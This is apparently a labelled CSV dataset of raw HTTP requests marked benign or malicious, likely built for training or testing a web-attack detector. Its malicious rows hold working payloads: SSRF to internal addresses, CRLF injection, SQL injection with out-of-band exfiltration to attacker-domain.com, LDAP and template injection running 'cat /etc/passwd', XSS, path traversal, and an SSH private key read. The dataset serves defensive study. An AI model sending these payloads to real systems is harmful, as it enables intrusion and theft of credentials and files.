label,text
benign,"POST /blog/post/comment HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: forum_session=9348a7dcx8w3q2v1
Origin: https://community.game-dev-forum.org

username=design_guru&comment=&postId=87654&notifyOnReply=on"
malicious,"GET /media/fetch?img=http%3A%2F%2Fstorage.cloud-daxia.tech%2Fpromo.png&img=http%3A%2F%2F172.16.0.10%2Finternal-api%2Fstatus&size=large HTTP/1.1
Host: cdn.cloud-daxia.tech
User-Agent: Python-urllib/3.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
malicious,"GET /reports/annual HTTP/1.1
Host: financial-analytics.ai
X-Forwarded-For: 198.51.100.23%0d%0aX-Injected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(X11;%20Linux%20x86_64;%20rv:89.0)%20Gecko/20100101%20Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br"
benign,"PUT /api/products/456 HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.zyx987abc654
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 198

{""id"":456,""name"":""4K Ultra HD Smart TV"",""category"":""electronics"",""price"":799.99,""stock"":34,""specs"":{""screenSize"":""55 inch"",""resolution"":""3840x2160"",""smartFeatures"":true},""tags"":[""tv"",""smart"",""ultra hd""]}"
malicious,"POST /api/v1/upload HTTP/1.1
Host: upload-service.nextgen-cloud.ai
Content-Type: application/json
User-Agent: Python-urllib/3.9
Accept: application/json
Accept-Encoding: gzip
Content-Length: 79

{""redirectUrl"":""http://0x7f.0x0.0x0.0x1/internal/status?check=1""}"
benign,"GET /api/v4/catalog/items?cursor=U1NMMTM5OHRhOGFi&viewSettings=eyJ2aWV3IjoiZGV0YWlsIiwibGFuZ3VhZ2UiOiJlbi1VUyJ9 HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36
DNT: 1
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: cloud-fintech-portal.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Content-Type: text/plain
Content-Length: 24
Referer: https://cloud-fintech-portal.biz/dashboard
Accept: text/plain, */*
Connection: keep-alive

Revalidation completed OK."
benign,"GET /data/api/fetchMetadata?url=https%3A%2F%2Fmy-personal-blog-site.info%2Fposts%2Ftravel-paris HTTP/1.1
Host: data.my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
malicious,"GET /dashboard/settings?config=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: user-management-system.io
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: UMSESSIONID=7e5a3c1d9b8f0246c5d7a1e9
Connection: keep-alive"
benign,"GET /items/list?filter%5Bcategory%5D=fitness&filter%5Bprice_min%5D=50&filter%5Bprice_max%5D=300&sort_by=reviews_desc HTTP/1.1
Host: fitwellgear-store.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: text/html
Referer: https://fitwellgear-store.net/
Connection: keep-alive"
malicious,"POST /service/fetch/render HTTP/1.1
Host: media-renderer.cloud-images.ai
User-Agent: Python-urllib/3.8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 85

imageUrl=http%3A%2F%2Fassets.social-gallery.biz%2Fphotos%2Fprofile.jpg&filter=sepia&imageUrl=http%3A%2F%2F127.0.0.1%3A8000%2Fadmin%2Fconfig"
benign,"POST /api/users/request_password_reset HTTP/1.1
Host: digital-healthcare-solutions.org
Accept: application/json
Content-Type: application/json
Pragma: no-cache
User-Agent: curl/7.88.1
Content-Length: 54

{""email"":""oliver.barnes@digital-healthcare-solutions.org""}"
benign,"GET /dashboard/overview HTTP/1.1
Host: enterprise-cloud-solutions.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
X-CSRF-Token: xTo7209YmZPT08jpv5oettD42Hl9MmePzwK5lyN7OJs=
Connection: keep-alive
Cookie: auth_sid=ud9fa37723ed39bf84a7; locale=en-US"
malicious,"POST /auth/signin HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: https://community.game-dev-forum.org

member_username=player1%00%01%08<script>alert(String.fromCharCode(88,83,83))</script>&member_password=letmein"
benign,"GET /api/xml/bookings?from=2024-02-01&to=2024-02-15&limit=10 HTTP/1.1
Host: travel-reservations.net
Accept: application/xml
Authorization: Bearer h57a98df32c609b0fa4c
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Connection: keep-alive
Accept-Encoding: gzip"
benign,"POST /submit/article HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Language: en-US
User-Agent: curl/7.79.1
Accept: */*
Content-Length: 212
Connection: keep-alive

------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""title""

A Day in the Mountains
------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""content""

I spent a beautiful day hiking and enjoying fresh air.
------WebKitFormBoundary5Z7UqnxGT3GmKyxP--"
malicious,"POST /directory/search HTTP/1.1
Host: unified-login-platform.cloud
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"POST /api/xml/createItem HTTP/1.1
Host: inventory-management.cloudstockhub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.empLqjq7vuf_oAstplQF9MPvmVsk
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 181
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<item>
  <name>Ergonomic Office Chair</name>
  <category>Furniture</category>
  <price>149.99</price>
  <stock>23</stock>
  <description>Comfortable chair with lumbar support and adjustable armrests.</description>
</item>"
malicious,"POST /forms/feedback HTTP/1.1
Host: portal-enterprise-cloud.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/json
Accept: application/json
Cache-Control: max-age=0
Content-Length: 233

{""email"":""julia.morris@portal-enterprise-cloud.io"",""feedback"":""Great service!"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
benign,"POST /poll/vote HTTP/1.1
Host: digital-gardening-community.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Accept: application/xml, text/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Referer: https://digital-gardening-community.org/poll

poll_id=73&vote_option=Yes"
benign,"POST /api/log HTTP/1.1
Host: mobile-app-stats.net
User-Agent: Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 201
Connection: keep-alive
X-Forwarded-For: 198.51.100.22

{""device"":{""model"":""SM-G996U"",""os"":""Android 13"",""appVersion"":""5.4.1""},""usage"":{""screenTimeMinutes"":134,""activeDays"":[""2024-06-10"",""2024-06-11"",""2024-06-12""]}}"
malicious,"POST /user/preferences/save HTTP/1.1
Host: settings-api.dynamic-configs.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
X-Notification-Endpoint: http://callback-dns-rebind.attack-vector.biz/track
Content-Length: 59
Pragma: no-cache

{""theme"":""dark-mode"",""notifications"":true,""language"":""en-US""}"
benign,"PUT /api/data/item123 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: text/plain
Content-Length: 25
Accept: text/plain
Via: 1.1 proxy.cloudservice.net

User email verified today."
malicious,"PUT /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Length: 26

{""filePath"": ""/root/.ssh/id_rsa""}"
benign,"PUT /api/v4/orders/987654321 HTTP/1.1
Host: express-delivery-service.net
Authorization: Bearer XyZ!@#9876543210abc987
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 138

<?xml version=""1.0""?>
<order>
  <status>shipped</status>
  <tracking_number>1Z999AA10123456784</tracking_number>
  <estimated_delivery>2024-06-15</estimated_delivery>
</order>"
benign,"POST /register HTTP/1.1
Host: healthwellness-group.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: https://healthwellness-group.org
Referer: https://healthwellness-group.org/register
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Cookie: session=4b2cc0af1d2344f98743
Connection: keep-alive

username=emma_lindstrom&email=emma.lindstrom%40healthwellness-group.org&password=WellBe1ng$2024&password_confirm=WellBe1ng$2024&terms_accepted=true"
benign,"GET /rss.xml HTTP/1.1
Host: urban-gardeners-community.org
Accept: application/rss+xml
User-Agent: Feedly/56.0 (+https://feedly.com)
Referer: https://urban-gardeners-community.org/gardening-tips
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /user/profile/photo-upload HTTP/1.1
Host: media-storage-center.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Accept-Encoding: gzip, deflate, br
User-Agent: curl/7.87.0
Connection: keep-alive

csrf_token=ed4f9d2917b3e2a5&form_id=photoUpload&timestamp=1685618791&image_url=https%3A%2F%2Fimages.media-storage-center.io%2Fuploads%2Fphoto1234.jpg&return_url=%2Fuser%2Fprofile"
benign,"POST /log HTTP/1.1
Host: session-tracker.ecom-analytics.biz
Origin: https://ecom-analytics.biz
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 38

event=add_to_cart&product=backpack&qty=1"
benign,"GET /images/logo.svg HTTP/1.1
Host: neo-art-collective.io
Accept: image/svg+xml,image/webp,*/*
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /features/education/online-learning-platform-review HTTP/1.1
Host: edutech-review.net
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xml;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /v1/orders/7a12bc45-88f3 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Authorization: Bearer mY5uPeRSeCReT12345token
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"POST /blog/comments HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive

comment=In+SQL%2C+the+DELETE+statement+is+used+to+remove+rows+from+a+table+based+on+specified+conditions."
benign,"GET /product/listing?filter%5Bcategory%5D=appliances&filter%5Benergy_rating%5D=a&page=1&sort_by=price_desc HTTP/1.1
Host: smarttech-appliances.info
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Referer: https://smarttech-appliances.info/products
Via: 1.1 smarttech-proxy
Connection: keep-alive"
malicious,"GET /redirect?url=//login-portal-secure.info%2F%2E%2E%2Fmalicious-site.org HTTP/1.1
Host: login-portal-secure.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://login-portal-secure.info/home
Connection: keep-alive"
malicious,"GET /blog/article/view?id=4321 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0%0d%0aNew-Header:%20BadStuff
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /products/electronics/cameras HTTP/1.1
Host: best-buy-online.biz
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://best-buy-online.biz/
Cookie: cart_id=7f9b0c3a-12a4-4dd6-84d7-abbcd1ffe92a; last_visited=2024-06-10T14%3A22%3A17Z
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android"""
benign,"GET /api/v1/devices/status/5657.xml HTTP/1.1
Host: iot-device-manager.cloud-sensor.net
Accept: application/xml
Authorization: Bearer Sdmk29dls82jdksl0x97
Accept-Language: de-DE,de;q=0.9,en-US;q=0.7,en;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
benign,"PUT /api/v5/employees/3592 HTTP/1.1
Host: hr-centralized-app.biz
Authorization: Bearer eyJhbGc1NiJ9.eyJlbXAiOiJlbXAwOElvIn0.lO2PnUwWXaho2XqYABtKtg
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Length: 144

{""id"":3592,""first_name"":""Alyssa"",""last_name"":""Nguyen"",""department"":""Marketing"",""email"":""alyssa.nguyen@hr-centralized-app.biz"",""status"":""active""}"
benign,"POST /forum/new/thread HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 612
Referer: https://community.game-dev-forum.org/threads
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: user_session=abc123def456ghi789&preferences=threadView%3Dflat
X-CSRF-Token: WZx74F5qJyS3PkX2aVxTeMbHu8L9OwYdHPT1

title=How+to+optimize+movement+in+large+levels%3F&category=game+mechanics&tags=optimization%2Clevel+design%2Cperformance&body=I+have+a+big+map+and+players+complain+about+lag.+Any+tips+for+making+movement+smoother%3F+Also%2C+should+I+use+navmeshes+or+waypoints%3F&anonymous=no&notifyReplies=yes&subscribeThread=yes&font=default&priority=normal&language=en&showSignatures=yes&emailOnReply=yes&signature=Thanks%2C+John+G.&avatar=default&profileVisibility=public&allowMentions=yes&contentWarnings=no&threadType=discussion&allowEdits=yes&sticky=no&locked=no&moderatorReview=no"
malicious,"POST /api/member/authenticate HTTP/1.1
Host: portal-hrm-advanced.com
Content-Type: application/json
Content-Length: 144
Accept: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
X-CSRF-Token: 65b982f4-e8af-4a5b-9598-bd4e11352f9a

{""memberId"":""user087"",""passcode"":""letMeIn' AnD (SeLeCt UsErNaMe from members where id=1)='admin'-- ""}"
benign,"PUT /v3/settings/update HTTP/1.1
Host: api.smart-home-hub.ai
Authorization: Token e7a9436d95283f04a7fa2e4b92c7c1d3
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ3A.210905.001)
Accept: application/json
Content-Length: 124
Connection: close

{""deviceId"":""hub-01a"",""settings_b64"":""eyJsaWdodCI6ICJhZnRlciIsICJ0ZW1wIjogMjMuNSwgImZhbl9vZmZfc2V0dGluZ3MiOiBbIm9uIiwgIm9mZiJdfQ==""}"
benign,"GET /forum/thread/58924/user-experience-tips HTTP/1.1
Host: nextgen-ui-community.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://source-code-exchange.dev/projects/open-source-uicomp
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /gallery/search?style=modern&style=abstract&style=surreal HTTP/1.1
Host: visualinnovations.studio
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
malicious,"GET /shop/cart/view HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: template_file=../../../../etc/hosts%00index; session_id=6b9c871e67321f23a8d152fbb"
benign,"GET /blog/article/view/42?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Pragma: no-cache"
malicious,"GET /blog/article/view?id=42%0d%0aSet-Cookie:%20userPref=darkmode; Path=/; Secure HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1"
